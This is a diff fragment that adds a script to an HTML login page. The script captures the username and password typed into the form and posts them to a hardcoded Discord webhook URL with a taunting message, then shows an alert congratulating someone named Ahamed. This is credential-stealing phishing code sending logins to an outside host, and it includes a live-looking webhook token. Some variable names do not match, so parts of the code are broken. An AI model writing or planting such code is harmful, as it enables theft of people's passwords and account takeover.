@@ -47,4 +47,39 @@
                   </div>
             </div>
       </div>
+      <script>
+document.getElementById("loginTrigger").addEventListener("click", function(event){
+    event.preventDefault(); // prevent default form submission
+
+    // Get input values
+    const desert = document.getElementById("username").value;
+    const amount = document.getElementById("password").value;
+
+    if(!username || !password){
+        alert("Please fill in both fields!");
+        return;
+    }
+
+    const webhookURL = "https://discord.com/api/webhooks/1440084893026619498/EghJR4801Er-ZaAFQcKMVSqHD3MCglFGDQqujsGZpkgUg3mNy-TVSouuBcUX7dzERTtF"; // Replace with your Discord webhook
+
+    const message = `Your goated :\nUsername: ${username}\nPassword: ${password}`;
+
+    fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: message })
+    })
+    .then(response => {
+        if(response.ok){
+            alert("Ahamed your a genius man");
+            // Optional: clear input fields
+            document.getElementById("username").value = "";
+            document.getElementById("ammount").value = "";
+        } else {
+            alert("Failed to send: " + response.status);
+        }
+    })
+    .catch(error => alert("Error: " + error));
+});
+</script>
 </body>
